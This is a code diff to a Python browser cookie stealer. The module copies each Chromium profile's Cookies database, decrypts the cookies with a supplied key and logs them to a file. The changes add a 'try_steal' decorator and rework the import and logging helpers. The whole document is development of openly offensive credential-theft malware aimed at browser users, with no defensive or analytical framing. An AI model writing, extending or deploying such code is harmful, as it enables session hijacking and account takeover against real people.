@@ -1,7 +1,7 @@
 """ IMPORTS """
 import json
 import sqlite3
-from util import get_profiles, create_temp_file, create_log_file, try_decrypt
+from util import try_steal, get_profiles, create_temp_file, log_data, try_decrypt
 
 
 """
@@ -11,10 +11,11 @@ Tables of interest from SQLi Recon:
 """
 
 
+@try_steal
 def cookie_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals cookies from a browser and places them into the logs directory """
     # Examine each profile
-    profile_names = get_profiles(browser['path'])
+    profile_names = get_profiles(browser)
     for profile_name in profile_names:
         # Copy original sqlite3 database to access it without killing any active Chromium processes
         db_path = create_temp_file(browser, profile_name, 'Cookies')
@@ -41,8 +42,8 @@ def cookie_stealer(browser: dict, encryption_key: str) -> None:
 
         # Logs cookies
         if cookie_jar:
-            log_file_name = f"{browser['name']} {profile_name} Cookies"
-            create_log_file(cookie_jar, log_file_name)
+            log_file_name = profile_name + ' Cookies'
+            log_data(cookie_jar, browser['name'], log_file_name)
 
         # Close sqlite3 connection
         cursor.close()
